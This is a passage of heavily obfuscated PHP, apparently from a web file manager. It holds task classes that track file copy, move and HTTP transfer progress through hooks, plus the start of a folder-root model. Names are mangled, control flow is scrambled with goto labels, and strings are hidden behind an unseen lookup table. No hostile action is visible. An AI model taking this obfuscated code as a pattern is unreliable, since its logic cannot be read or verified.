EÔÛ»í’·Ø; EŒ¢‚¿†•±: $EŒ·ÅÄÆæ¤ =& $_SERVER[©]; $b¡Ã¶ãº‘Ó =& $this->task; if (!$b¡Ã¶ãº‘Ó) { return; } goto eİçª¦Ìõ; Cô›œóŞÔÎ: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($B‚ÓÜ›Ö¹Æ) { $fÀğÏ¡ìøò =& $_SERVER[©]; Cache::set($fÀğÏ¡ìøò[1451] . $this->task[$fÀğÏ¡ìøò[375]], $B‚ÓÜ›Ö¹Æ, 60); return $B‚ÓÜ›Ö¹Æ; } public static function get($a‰Ù²†«¢) { return self::valueGet($a‰Ù²†«¢); } public static function listData() { $AáÔ™ˆ… = self::valueGet(); return array_sort_by($AáÔ™ˆ…, $_SERVER[©][1437], !0); } public static function kill($fÁø´¤ÖØ¥) { return self::changeStatus($fÁø´¤ÖØ¥, self::STATYS_KILL); } public static function stop($B”Ò•Å‡¼Ò) { return self::changeStatus($B”Ò•Å‡¼Ò, self::STATYS_STOP); } public static function restart($AÒ¸èÀÑ£î) { return self::changeStatus($AÒ¸èÀÑ£î, self::STATYS_RUNNING); } public static function killAll() { $BÆö‡®˜–Ü =& $_SERVER[©]; $aĞâË©‘Íï = self::listData(); foreach ($aĞâË©‘Íï as $C–Ï¨æ÷ÏÈ) { self::kill($C–Ï¨æ÷ÏÈ[$BÆö‡®˜–Ü[375]]); } sleep(2); foreach ($aĞâË©‘Íï as $C–Ï¨æ÷ÏÈ) { self::valueSet($C–Ï¨æ÷ÏÈ[$BÆö‡®˜–Ü[375]], !1); } } private static function changeStatus($FÛó‡ŠËœ˜, $cîóÆ˜÷äø) { goto d Í©Œ²¡; d Í©Œ²¡: $BŠ±–áÁå =& $_SERVER[©]; $eÉµ¸æÛ = self::valueGet($FÛó‡ŠËœ˜); if (!$eÉµ¸æÛ) { return !1; } goto f£–¿Ñ«ĞÛ; f£–¿Ñ«ĞÛ: $eÉµ¸æÛ[$BŠ±–áÁå[688]] = $cîóÆ˜÷äø; self::valueSet($FÛó‡ŠËœ˜, $eÉµ¸æÛ); self::log($BŠ±–áÁå[1453] . $eÉµ¸æÛ[$BŠ±–áÁå[375]] . $BŠ±–áÁå[1454] . $cîóÆ˜÷äø); goto c«•‚„‘­´; c«•‚„‘­´: return !0; goto F–¡Ø¡; F–¡Ø¡: } public static function valueGet($b¼Ü²À…ªù = false) { $EêÎá‚¼À =& $_SERVER[©]; if ($b¼Ü²À…ªù) { $EÍ¡…ï‹ˆä = Model($EêÎá‚¼À[407])->where(array($EêÎá‚¼À[99] => $b¼Ü²À…ªù, $EêÎá‚¼À[39] => $EêÎá‚¼À[1455]))->find(); return $EÍ¡…ï‹ˆä ? json_decode($EÍ¡…ï‹ˆä[$EêÎá‚¼À[368]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($d³Ì”§‹É„ = false) { goto fğ†Ôğ¥Š; fä…ºãÆ…İ: return $DØˆÖäƒŠî; goto b˜°¹×¾Õ; fğ†Ôğ¥Š: $A‘ä‘‘Á‡ =& $_SERVER[©]; $e”ë—³·§ = array($A‘ä‘‘Á‡[39] => $A‘ä‘‘Á‡[1455]); if ($d³Ì”§‹É„) { $e”ë—³·§[$A‘ä‘‘Á‡[1434]] = $d³Ì”§‹É„; } goto CÓÌ¹ƒ¼†; CÓÌ¹ƒ¼†: $DØˆÖäƒŠî = Model($A‘ä‘‘Á‡[407])->where($e”ë—³·§)->select(); $DØˆÖäƒŠî = $DØˆÖäƒŠî ? $DØˆÖäƒŠî : array(); foreach ($DØˆÖäƒŠî as $fíÇø›Ñ‘Ò => $DàÌ± ‚‡„) { $DØˆÖäƒŠî[$fíÇø›Ñ‘Ò] = json_decode($DàÌ± ‚‡„[$A‘ä‘‘Á‡[368]], !0); } goto fä…ºãÆ…İ; b˜°¹×¾Õ: } public static function valueSet($FÔÛ´½·á×, $fµ…Ë™¯¹) { goto b×ó“¬‹Ê; dÊ‡ìŞîº: Model($dŸ¯Ç³ì‹å[407])->add($A¿³ÑˆÑÙá, array(), !0); goto bõÄŠé‚ë; b×ó“¬‹Ê: $dŸ¯Ç³ì‹å =& $_SERVER[©]; if (!$fµ…Ë™¯¹) { return Model($dŸ¯Ç³ì‹å[407])->where(array($dŸ¯Ç³ì‹å[99] => $FÔÛ´½·á×, $dŸ¯Ç³ì‹å[39] => $dŸ¯Ç³ì‹å[1455]))->delete(); } $D„ã‘„–Ë‰ = json_encode($fµ…Ë™¯¹); goto AïŠÌÛô; AïŠÌÛô: if (!$D„ã‘„–Ë‰) { ob_start(); var_dump($fµ…Ë™¯¹); $fÆ™ÛŒõÅÒ = ob_get_clean(); self::log($dŸ¯Ç³ì‹å[1456] . json_encode_force($fÆ™ÛŒõÅÒ)); } if (!$FÔÛ´½·á× || !$fµ…Ë™¯¹[$dŸ¯Ç³ì‹å[375]]) { return !1; } $A¿³ÑˆÑÙá = array($dŸ¯Ç³ì‹å[39] => $dŸ¯Ç³ì‹å[1455], $dŸ¯Ç³ì‹å[1434] => USER_ID, $dŸ¯Ç³ì‹å[99] => $FÔÛ´½·á×, $dŸ¯Ç³ì‹å[368] => $D„ã‘„–Ë‰); goto dÊ‡ìŞîº; bõÄŠé‚ë: } public static function log($CÓùŸ¤‡Ê¨) { write_log($CÓùŸ¤‡Ê¨, $_SERVER[©][1457]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto F‰Éê„¤‰Ê; B©«Êœ‚Ù²: Hook::bind($AÕÍ½Š‰Ìé[1471], array($this, $AÕÍ½Š‰Ìé[1472])); Hook::bind($AÕÍ½Š‰Ìé[1473], array($this, $AÕÍ½Š‰Ìé[1474])); Hook::bind($AÕÍ½Š‰Ìé[1475], array($this, $AÕÍ½Š‰Ìé[1476])); goto BÀÅÜÍ¹±”; CêİÅ²øŒË: $d«çÆî­Œß[$AÕÍ½Š‰Ìé[1483]] = 0; $d«çÆî­Œß[$AÕÍ½Š‰Ìé[1484]] = 0; if (!$d«çÆî­Œß[$AÕÍ½Š‰Ìé[1338]]) { $d«çÆî­Œß[$AÕÍ½Š‰Ìé[1338]] = LNG($AÕÍ½Š‰Ìé[1485]); } goto cä‹÷¿Ã¼Å; D×§öß¢·°: Hook::bind($AÕÍ½Š‰Ìé[519], array($this, $AÕÍ½Š‰Ìé[1467])); Hook::bind($AÕÍ½Š‰Ìé[521], array($this, $AÕÍ½Š‰Ìé[1467])); Hook::bind($AÕÍ½Š‰Ìé[523], array($this, $AÕÍ½Š‰Ìé[1467])); goto cõÚ¨‹ò–; F‰Éê„¤‰Ê: $AÕÍ½Š‰Ìé =& $_SERVER[©]; $d«çÆî­Œß =& $this->task; $this->sourceCopyFolder = !1; goto Bî°À¾³¼; BÀÅÜÍ¹±”: $d«çÆî­Œß[$AÕÍ½Š‰Ìé[1477]] = LNG($AÕÍ½Š‰Ìé[1478]); $d«çÆî­Œß[$AÕÍ½Š‰Ìé[1479]] = 0; $d«çÆî­Œß[$AÕÍ½Š‰Ìé[1480]] = 0; goto cƒ´“¸½÷í; Bî°À¾³¼: Hook::bind($AÕÍ½Š‰Ìé[1458], array($this, $AÕÍ½Š‰Ìé[1459])); Hook::bind($AÕÍ½Š‰Ìé[1460], array($this, $AÕÍ½Š‰Ìé[1461])); Hook::bind($AÕÍ½Š‰Ìé[1462], array($this, $AÕÍ½Š‰Ìé[1463])); goto CÇ“ °Ÿ‚î; cõÚ¨‹ò–: Hook::bind($AÕÍ½Š‰Ìé[1468], array($this, $AÕÍ½Š‰Ìé[1469])); Hook::bind($AÕÍ½Š‰Ìé[540], array($this, $AÕÍ½Š‰Ìé[1470])); $this->sourceModelCopyFlag = !1; goto B©«Êœ‚Ù²; cƒ´“¸½÷í: $d«çÆî­Œß[$AÕÍ½Š‰Ìé[975]] = $AÕÍ½Š‰Ìé[43]; $d«çÆî­Œß[$AÕÍ½Š‰Ìé[1481]] = $AÕÍ½Š‰Ìé[43]; $d«çÆî­Œß[$AÕÍ½Š‰Ìé[1482]] = 0; goto CêİÅ²øŒË; Eöéîõ£ì±: Hook::bind($AÕÍ½Š‰Ìé[551], array($this, $AÕÍ½Š‰Ìé[1466])); Hook::bind($AÕÍ½Š‰Ìé[517], array($this, $AÕÍ½Š‰Ìé[1467])); Hook::bind($AÕÍ½Š‰Ìé[514], array($this, $AÕÍ½Š‰Ìé[1467])); goto D×§öß¢·°; CÇ“ °Ÿ‚î: Hook::bind($AÕÍ½Š‰Ìé[547], array($this, $AÕÍ½Š‰Ìé[1464])); Hook::bind($AÕÍ½Š‰Ìé[548], array($this, $AÕÍ½Š‰Ìé[1465])); Hook::bind($AÕÍ½Š‰Ìé[550], array($this, $AÕÍ½Š‰Ìé[1466])); goto Eöéîõ£ì±; cä‹÷¿Ã¼Å: } protected function endAfter() { goto A¥ƒ†ñ˜õ; fÌÕ¥×²Şø: Hook::unbind($c½º§Ş–á[523], array($this, $c½º§Ş–á[1467])); Hook::unbind($c½º§Ş–á[1468], array($this, $c½º§Ş–á[1469])); Hook::unbind($c½º§Ş–á[540], array($this, $c½º§Ş–á[1470])); goto e¡¼ÕÄ³Ê; A¥ƒ†ñ˜õ: $c½º§Ş–á =& $_SERVER[©]; Hook::unbind($c½º§Ş–á[1458], array($this, $c½º§Ş–á[1459])); Hook::unbind($c½º§Ş–á[1460], array($this, $c½º§Ş–á[1461])); goto Cãâ¯‘‚®Å; e¡¼ÕÄ³Ê: Hook::unbind($c½º§Ş–á[1471], array($this, $c½º§Ş–á[1472])); Hook::unbind($c½º§Ş–á[1473], array($this, $c½º§Ş–á[1474])); Hook::unbind($c½º§Ş–á[1475], array($this, $c½º§Ş–á[1476])); goto cêáö­àëÌ; DÍğôêÉí­: Hook::unbind($c½º§Ş–á[550], array($this, $c½º§Ş–á[1466])); Hook::unbind($c½º§Ş–á[551], array($this, $c½º§Ş–á[1466])); Hook::unbind($c½º§Ş–á[517], array($this, $c½º§Ş–á[1467])); goto Aù®×‚¹š; Cãâ¯‘‚®Å: Hook::unbind($c½º§Ş–á[1462], array($this, $c½º§Ş–á[1463])); Hook::unbind($c½º§Ş–á[547], array($this, $c½º§Ş–á[1464])); Hook::unbind($c½º§Ş–á[548], array($this, $c½º§Ş–á[1465])); goto DÍğôêÉí­; Aù®×‚¹š: Hook::unbind($c½º§Ş–á[514], array($this, $c½º§Ş–á[1467])); Hook::unbind($c½º§Ş–á[519], array($this, $c½º§Ş–á[1467])); Hook::unbind($c½º§Ş–á[521], array($this, $c½º§Ş–á[1467])); goto fÌÕ¥×²Şø; cêáö­àëÌ: } public function copyMoveStart($D²’¸ìŠ„, $b—º¼ÜÏÎ, $Cãˆ¥çš, $dÀÜ¶²Ìã) { goto dâ·˜ã·×; dâ·˜ã·×: $eğ°›ÅÍ¦È =& $_SERVER[©]; self::log($eğ°›ÅÍ¦È[1486] . $b—º¼ÜÏÎ . $eğ°›ÅÍ¦È[76] . $dÀÜ¶²Ìã); $EÏíŠŸ‚±— = rtrim(TEMP_FILES, $eğ°›ÅÍ¦È[18]); goto bÓÁº‹²‚Š; f—¼À²é¦š: $bÂ¸Öº‚Â”[$eğ°›ÅÍ¦È[1487]] = KodIO::transferType($D²’¸ìŠ„, $Cãˆ¥çš); $this->update(); goto fËİ› á¯£; bÓÁº‹²‚Š: if (substr($b—º¼ÜÏÎ, 0, strlen($EÏíŠŸ‚±—)) == $EÏíŠŸ‚±—) { return; } if (substr($dÀÜ¶²Ìã, 0, strlen($EÏíŠŸ‚±—)) == $EÏíŠŸ‚±—) { return; } $bÂ¸Öº‚Â” =& $this->task; goto f—¼À²é¦š; fËİ› á¯£: } public function updateAfter() { goto CÀÚÁÚ¯Ô; c£ïÀ£¹Š°: if ($this->sourceModelCopyFlag) { return; } if ($DÏÜŠÖĞÆí[$B¾â±¡ˆÃâ[1487]] == $B¾â±¡ˆÃâ[1091]) { return; } if ($DÏÜŠÖĞÆí[$B¾â±¡ˆÃâ[1487]] == $B¾â±¡ˆÃâ[1037] || $DÏÜŠÖĞÆí[$B¾â±¡ˆÃâ[1487]] == $B¾â±¡ˆÃâ[113]) { if ($DÏÜŠÖĞÆí[$B¾â±¡ˆÃâ[1481]]) { $DÏÜŠÖĞÆí[$B¾â±¡ˆÃâ[1484]] = $DÏÜŠÖĞÆí[$B¾â±¡ˆÃâ[1483]] + $DÏÜŠÖĞÆí[$B¾â±¡ˆÃâ[1480]]; } } else { if ($DÏÜŠÖĞÆí[$B¾â±¡ˆÃâ[1487]] == $B¾â±¡ˆÃâ[1092]) { if ($DÏÜŠÖĞÆí[$B¾â±¡ˆÃâ[1481]] == $B¾â±¡ˆÃâ[1037]) { $DÏÜŠÖĞÆí[$B¾â±¡ˆÃâ[1484]] = $DÏÜŠÖĞÆí[$B¾â±¡ˆÃâ[1483]] + $DÏÜŠÖĞÆí[$B¾â±¡ˆÃâ[1480]] * 0.5; } else { if ($DÏÜŠÖĞÆí[$B¾â±¡ˆÃâ[1481]] == $B¾â±¡ˆÃâ[113]) { $DÏÜŠÖĞÆí[$B¾â±¡ˆÃâ[1484]] = $DÏÜŠÖĞÆí[$B¾â±¡ˆÃâ[1483]] + $DÏÜŠÖĞÆí[$B¾â±¡ˆÃâ[1479]] * 0.5 + $DÏÜŠÖĞÆí[$B¾â±¡ˆÃâ[1480]] * 0.5; } } } } goto B„áÊ‡‘’‚; B„áÊ‡‘’‚: $DÏÜŠÖĞÆí[$B¾â±¡ˆÃâ[1435]] = $DÏÜŠÖĞÆí[$B¾â±¡ˆÃâ[1484]] / $DÏÜŠÖĞÆí[$B¾â±¡ˆÃâ[697]]; if ($DÏÜŠÖĞÆí[$B¾â±¡ˆÃâ[1435]] > 0) { $B³›‰Ù‘¡â = timeFloat() - $DÏÜŠÖĞÆí[$B¾â±¡ˆÃâ[1437]] - $DÏÜŠÖĞÆí[$B¾â±¡ˆÃâ[1440]]; $DÏÜŠÖĞÆí[$B¾â±¡ˆÃâ[1441]] = $B³›‰Ù‘¡â * (1 - $DÏÜŠÖĞÆí[$B¾â±¡ˆÃâ[1435]]) / $DÏÜŠÖĞÆí[$B¾â±¡ˆÃâ[1435]]; } goto e¹º‚ä¸À; CÀÚÁÚ¯Ô: $B¾â±¡ˆÃâ =& $_SERVER[©]; $DÏÜŠÖĞÆí =& $this->task; if (!$DÏÜŠÖĞÆí[$B¾â±¡ˆÃâ[697]]) { return; } goto c£ïÀ£¹Š°; e¹º‚ä¸À: } public function addPath($e–Ø°î›Ä–) { goto B­ã‡æœ´; c±‘óÓªÄ: if ($C÷ª…× ôÒ[$dÉ‡å•÷[39]] == $dÉ‡å•÷[177]) { $eáªÂ‡­…Ó[$dÉ‡å•÷[973]] += 1; } else { $eáªÂ‡­…Ó[$dÉ‡å•÷[973]] += $C÷ª…× ôÒ[$dÉ‡å•÷[90]][$dÉ‡å•÷[88]]; if ($C÷ª…× ôÒ[$dÉ‡å•÷[377]]) { $eáªÂ‡­…Ó[$dÉ‡å•÷[973]] += $C÷ª…× ôÒ[$dÉ‡å•÷[90]][$dÉ‡å•÷[89]] + 1; } } $eáªÂ‡­…Ó[$dÉ‡å•÷[697]] += $C÷ª…× ôÒ[$dÉ‡å•÷[87]]; $this->update(); goto BØ˜çÑÕ¿­; B­ã‡æœ´: $dÉ‡å•÷ =& $_SERVER[©]; if (!$e–Ø°î›Ä–) { return; } $eáªÂ‡­…Ó =& $this->task; goto A“£šøÍ‹š; A“£šøÍ‹š: $C÷ª…× ôÒ = IO::infoWithChildren($e–Ø°î›Ä–); $aÕ—†àº×š = $eáªÂ‡­…Ó[$dÉ‡å•÷[1488]] ? $eáªÂ‡­…Ó[$dÉ‡å•÷[1488]][$dÉ‡å•÷[1489]] : 0; $eáªÂ‡­…Ó[$dÉ‡å•÷[1488]] = array($dÉ‡å•÷[1489] => $aÕ—†àº×š + 1, $dÉ‡å•÷[394] => $C÷ª…× ôÒ[$dÉ‡å•÷[38]], $dÉ‡å•÷[85] => $C÷ª…× ôÒ[$dÉ‡å•÷[85]], $dÉ‡å•÷[474] => $C÷ª…× ôÒ[$dÉ‡å•÷[474]] ? $C÷ª…× ôÒ[$dÉ‡å•÷[474]] : $C÷ª…× ôÒ[$dÉ‡å•÷[85]]); goto c±‘óÓªÄ; BØ˜çÑÕ¿­: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($E»§Œß‚) { $Fª™Øê¸Õñ =& $_SERVER[©]; $FËºÚê”™à =& $this->task; $FËºÚê”™à[$Fª™Øê¸Õñ[1477]] = $E»§Œß‚[$Fª™Øê¸Õñ[38]]; $FËºÚê”™à[$Fª™Øê¸Õñ[975]] = $E»§Œß‚[$Fª™Øê¸Õñ[38]]; $this->update(); } public function copyFileStart($CìõÄÆØ‚è, $a›Ø«¶¹Â±, $EÄ‰İÇæè‡, $c‹Äƒä, $D•ÒÔó †, $cø”Íé‹‰) { goto cñ‚­ËÆßŠ; E÷å‡èŒ‰: $D¢ÒöĞÛêğ[$D®·ß¿ˆ‡¶[1477]] = $e®ÜÀìôÕ¼; $D¢ÒöĞÛêğ[$D®·ß¿ˆ‡¶[1479]] = (int) $CìõÄÆØ‚è->size($a›Ø«¶¹Â±); $D¢ÒöĞÛêğ[$D®·ß¿ˆ‡¶[1480]] = 0; goto dš…¢¾ÖÍ›; cñ‚­ËÆßŠ: $D®·ß¿ˆ‡¶ =& $_SERVER[©]; $e®ÜÀìôÕ¼ = $D•ÒÔó †; if ($e®ÜÀìôÕ¼ == $GLOBALS[$D®·ß¿ˆ‡¶[1490]]) { $e®ÜÀìôÕ¼ = $GLOBALS[$D®·ß¿ˆ‡¶[1491]]; } goto EŒù² œ™á; dš…¢¾ÖÍ›: $D¢ÒöĞÛêğ[$D®·ß¿ˆ‡¶[975]] = $D®·ß¿ˆ‡¶[43]; $D¢ÒöĞÛêğ[$D®·ß¿ˆ‡¶[1481]] = $D®·ß¿ˆ‡¶[43]; $D¢ÒöĞÛêğ[$D®·ß¿ˆ‡¶[1482]] = 0; goto dÇ‘›†‡–; dÇ‘›†‡–: $this->update(); goto A¥®¸·½Ç; EŒù² œ™á: $GLOBALS[$D®·ß¿ˆ‡¶[1491]] = $D•ÒÔó †; $GLOBALS[$D®·ß¿ˆ‡¶[1490]] = $cø”Íé‹‰; $D¢ÒöĞÛêğ =& $this->task; goto E÷å‡èŒ‰; A¥®¸·½Ç: } public function copyFileEnd($F¸àØ‹”Ë, $BÓ©¢Ş×Ìì, $EİÇˆ›ÏÆŞ, $CñéÌÙä, $dâğÚÅ™Ş, $B£³–‹ÃÈï) { $c¸ËÀ«¨î» =& $_SERVER[©]; $DöèöÏ¡Û¤ =& $this->task; $DöèöÏ¡Û¤[$c¸ËÀ«¨î»[1480]] = $DöèöÏ¡Û¤[$c¸ËÀ«¨î»[1479]]; $DöèöÏ¡Û¤[$c¸ËÀ«¨î»[1481]] = $c¸ËÀ«¨î»[43]; if ($dâğÚÅ™Ş == $DöèöÏ¡Û¤[$c¸ËÀ«¨î»[1477]]) { $DöèöÏ¡Û¤[$c¸ËÀ«¨î»[1483]] += $DöèöÏ¡Û¤[$c¸ËÀ«¨î»[1479]]; $DöèöÏ¡Û¤[$c¸ËÀ«¨î»[1484]] = $DöèöÏ¡Û¤[$c¸ËÀ«¨î»[1483]]; $this->update(1); } else { $this->update(); $DöèöÏ¡Û¤[$c¸ËÀ«¨î»[1480]] = 0; } self::log($c¸ËÀ«¨î»[1492] . $BÓ©¢Ş×Ìì . $c¸ËÀ«¨î»[76] . $CñéÌÙä . $c¸ËÀ«¨î»[9] . $dâğÚÅ™Ş . $c¸ËÀ«¨î»[1493] . $DöèöÏ¡Û¤[$c¸ËÀ«¨î»[1477]]); } public function updateFileEnd($E¸íÂâØí¨, $eºÎºØÂÌ«) { goto A©İ¡‰İò; bÚƒÇ±ãæ: $B½¡œÃÌËé[$Céå‹®ÈÇ¢[1479]] = $eºÎºØÂÌ«; $B½¡œÃÌËé[$Céå‹®ÈÇ¢[1483]] += $eºÎºØÂÌ«; $B½¡œÃÌËé[$Céå‹®ÈÇ¢[1484]] = $B½¡œÃÌËé[$Céå‹®ÈÇ¢[1483]]; goto bÕ‚¯ÏŠÒ†; bÕ‚¯ÏŠÒ†: $this->update(1); self::log($Céå‹®ÈÇ¢[1494] . $E¸íÂâØí¨); goto dÇ©¤“ÜĞ…; A©İ¡‰İò: $Céå‹®ÈÇ¢ =& $_SERVER[©]; $B½¡œÃÌËé =& $this->task; $B½¡œÃÌËé[$Céå‹®ÈÇ¢[1477]] = $E¸íÂâØí¨; goto bÚƒÇ±ãæ; dÇ©¤“ÜĞ…: } public function sourceModelCopy($FÔ‰‚Ò‰•£) { goto CÜäÄ¢óŠ¹; bİŒ§À¾Ü: switch ($dàÔ§ô›Ë) { case $fšç›¢ò¢[515]: $B‰ªİšÀ = 1; break; case $fšç›¢ò¢[518]: $b¸œŒ²ëÕÄ[$fšç›¢ò¢[1477]] = $BÉÒëñ¾¯‹[$fšç›¢ò¢[38]]; break; case $fšç›¢ò¢[520]: $B‰ªİšÀ = intval($FÔ‰‚Ò‰•£[$fšç›¢ò¢[371]] * 0.4); break; case $fšç›¢ò¢[522]: $B‰ªİšÀ = intval($FÔ‰‚Ò‰•£[$fšç›¢ò¢[371]] * 0.2); break; case $fšç›¢ò¢[524]: $B‰ªİšÀ = intval($FÔ‰‚Ò‰•£[$fšç›¢ò¢[371]] * 0.4); break; } $this->update($B‰ªİšÀ); $this->sourceModelCopyFlag = !1; goto E²ë£¹ˆ ¸; CÜäÄ¢óŠ¹: $fšç›¢ò¢ =& $_SERVER[©]; $dàÔ§ô›Ë = $FÔ‰‚Ò‰•£[0]; $BÉÒëñ¾¯‹ = $FÔ‰‚Ò‰•£[1]; goto f»Ì‰…‹Ñ”; f»Ì‰…‹Ñ”: $b¸œŒ²ëÕÄ =& $this->task; $this->sourceModelCopyFlag = !0; $B‰ªİšÀ = 0; goto bİŒ§À¾Ü; E²ë£¹ˆ ¸: } public function sourceRemove($fšôõ–Ìé„, $bİÔ­Š¨–Î) { $cŠÆƒ”âñŠ =& $_SERVER[©]; $this->sourceModelCopyFlag = !0; $fÄÃÊˆ—Ü = 1; if (isset($fšôõ–Ìé„[$cŠÆƒ”âñŠ[90]])) { $fÄÃÊˆ—Ü = $fšôõ–Ìé„[$cŠÆƒ”âñŠ[90]][$cŠÆƒ”âñŠ[88]] + $fšôõ–Ìé„[$cŠÆƒ”âñŠ[90]][$cŠÆƒ”âñŠ[89]] + 1; } $this->update($fÄÃÊˆ—Ü); $this->sourceModelCopyFlag = !1; } public function sourceMove($d¿‡Ù„‡) { $this->sourceRemove($d¿‡Ù„‡, !1); } public function curlProgress($CæƒƒŠÜÒ, $aÕ‡Ó×¤¸Æ, $F‰ëĞ¡àè, $a›„ ¢¬ë, $F…ÕîÀŠÍÎ) { $BØ¨£É«İ× =& $_SERVER[©]; $cÔ¶¶²ë° =& $this->task; if ($F…ÕîÀŠÍÎ > 0) { $cÔ¶¶²ë°[$BØ¨£É«İ×[975]] = $BØ¨£É«İ×[1495]; $cÔ¶¶²ë°[$BØ¨£É«İ×[1481]] = $BØ¨£É«İ×[113]; if ($cÔ¶¶²ë°[$BØ¨£É«İ×[1479]] == $a›„ ¢¬ë || $a›„ ¢¬ë > 1024 * 1024) { $cÔ¶¶²ë°[$BØ¨£É«İ×[1480]] = $F…ÕîÀŠÍÎ; } if ($cÔ¶¶²ë°[$BØ¨£É«İ×[1482]]) { $cÔ¶¶²ë°[$BØ¨£É«İ×[1480]] = $F…ÕîÀŠÍÎ + $cÔ¶¶²ë°[$BØ¨£É«İ×[1482]]; } } else { if ($F‰ëĞ¡àè > 0) { if ($cÔ¶¶²ë°[$BØ¨£É«İ×[1479]] == $aÕ‡Ó×¤¸Æ) { $cÔ¶¶²ë°[$BØ¨£É«İ×[1480]] = $F‰ëĞ¡àè; $cÔ¶¶²ë°[$BØ¨£É«İ×[975]] = $BØ¨£É«İ×[1496]; $cÔ¶¶²ë°[$BØ¨£É«İ×[1481]] = $BØ¨£É«İ×[1037]; } } } $this->update(); } public function curlProgressStart($Eç½‹£—Í) { } public function curlProgressEnd($EÆ®ÙÖÊ ë) { $aª¿ÃÙæó¨ =& $_SERVER[©]; $dÈØäÛí¡ =& $this->task; $d¼èäóç½ = curl_getinfo($EÆ®ÙÖÊ ë); $a—½Æï†´ó = $d¼èäóç½[$aª¿ÃÙæó¨[1497]]; if ($dÈØäÛí¡[$aª¿ÃÙæó¨[1481]] == $aª¿ÃÙæó¨[113] && $a—½Æï†´ó) { $dÈØäÛí¡[$aª¿ÃÙæó¨[1482]] += $a—½Æï†´ó; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $dÉç×¿ù„¸ =& $_SERVER[©]; $EÜˆ‘ÁÓ· =& $this->task; $EÜˆ‘ÁÓ·[$dÉç×¿ù„¸[1498]] = 1; Hook::bind($dÉç×¿ù„¸[1471], array($this, $dÉç×¿ù„¸[1499])); Hook::bind($dÉç×¿ù„¸[1473], array($this, $dÉç×¿ù„¸[1500])); Hook::bind($dÉç×¿ù„¸[1475], array($this, $dÉç×¿ù„¸[1501])); } protected function endAfter() { $EÚğæŸˆ± =& $_SERVER[©]; Hook::unbind($EÚğæŸˆ±[1471], array($this, $EÚğæŸˆ±[1499])); Hook::unbind($EÚğæŸˆ±[1473], array($this, $EÚğæŸˆ±[1500])); Hook::unbind($EÚğæŸˆ±[1475], array($this, $EÚğæŸˆ±[1501])); } public function progressStart($eö‘â¨ ‰—) { $bÔºÍĞÉõ  =& $_SERVER[©]; $F¹ÆÃ¿ë¨£ = curl_getinfo($eö‘â¨ ‰—); self::log($bÔºÍĞÉõ [1502] . $F¹ÆÃ¿ë¨£[$bÔºÍĞÉõ [304]]); self::valueSet($this->task[$bÔºÍĞÉõ [375]], $this->task); } public function progressEnd($Aˆ˜£æìâ) { $fêà‹çÚß™ =& $_SERVER[©]; self::log($fêà‹çÚß™[1503] . $this->task[$fêà‹çÚß™[375]]); $this->end(); } public function progress($eîºÓãõ¿, $bâ¬¾•¬ÌÕ, $D—…øĞ¤â•, $Fì¿ìÅÄ§ä, $C•„¯İò§ã) { $fŒÁæ’Ä =& $_SERVER[©]; $C‘Ú¯Ëí­‚ =& $this->task; if ($C•„¯İò§ã > 0) { $C‘Ú¯Ëí­‚[$fŒÁæ’Ä[973]] = $C‘Ú¯Ëí­‚[$fŒÁæ’Ä[973]] == 0 ? $Fì¿ìÅÄ§ä : $C‘Ú¯Ëí­‚[$fŒÁæ’Ä[973]]; $C‘Ú¯Ëí­‚[$fŒÁæ’Ä[987]] = $C•„¯İò§ã; } else { if ($D—…øĞ¤â• > 0) { $C‘Ú¯Ëí­‚[$fŒÁæ’Ä[973]] = $C‘Ú¯Ëí­‚[$fŒÁæ’Ä[973]] == 0 ? $bâ¬¾•¬ÌÕ : $C‘Ú¯Ëí­‚[$fŒÁæ’Ä[973]]; $C‘Ú¯Ëí­‚[$fŒÁæ’Ä[987]] = $D—…øĞ¤â•; } } $this->update(); self::log("\160\162\x6f\x67\x72\x65\x73\163\x48\164\164\160\72\144\x6f\167\x6e\x3a{$D—…øĞ¤â•}\x2f{$bâ¬¾•¬ÌÕ}\x3b\x20\x75\x70\x6c\157\x61\x64\x3a{$C•„¯İò§ã}\57{$Fì¿ìÅÄ§ä}\73"); } } goto Dˆ²æÛÄÍ×; Aã¹È±É‹–: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Côƒçõ¯ù×) { $eç†Œ‡ë© =& $_SERVER[©]; $A…¡¯Éè¤ = Model($eç†Œ‡ë©[482])->where(array($eç†Œ‡ë©[1425] => $Côƒçõ¯ù×))->find(); $C¤¦ò‘„Óµ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Côƒçõ¯ù×, $A…¡¯Éè¤[$eç†Œ‡ë©[38]]); $this->userDesktopAdd($C¤¦ò‘„Óµ); return $C¤¦ò‘„Óµ; } public function userDesktopAdd($aâ‹´¼¤Ê…) { $aˆôñÛÑè° =& $_SERVER[©]; $fŠœä½İ®ˆ = LNG($aˆôñÛÑè°[2329]); $d²¸‡ªÒáë = $this->mkdir($aâ‹´¼¤Ê…, $fŠœä½İ®ˆ); $this->metaSet($d²¸‡ªÒáë, $aˆôñÛÑè°[2330], $aˆôñÛÑè°[93]); $this->metaSet($aâ‹´¼¤Ê…, $aˆôñÛÑè°[2331], $d²¸‡ªÒáë); } public function groupRootAdd($fø¢†¡Å²·) { $eÏÃ™º¦ôö =& $_SERVER[©]; $Cåİì¿³²— = Model($eÏÃ™º¦ôö[466])->where(array($eÏÃ™º¦ôö[2176] => $fø¢†¡Å²·))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $fø¢†¡Å²·, $Cåİì¿³²—[$eÏÃ™º¦ôö[38]]); } public function systemRootPathAdd($C¡ÍÛß¬¾–) { if ($C¡ÍÛß¬¾– != $_SERVER[©][1086]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $C¡ÍÛß¬¾–); } public function userRootRemove($C¶“³ù¸˜¿) { $F¼£…÷ªŸ = $this->sourceRoot(SourceModel::TYPE_USER, $C¶“³ù¸˜¿); if (!$F¼£…÷ªŸ) { return; } $this->remove($F¼£…÷ªŸ, !1); } public function groupRootRemove($cÛÙ¢­áîæ) { $AÒÕï•‹¥É = $this->sourceRoot(SourceModel::TYPE_GROUP, $cÛÙ¢­áîæ); if (!$AÒÕï•‹¥É) { return; } $this->remove($AÒÕï•‹¥É, !1); } private function 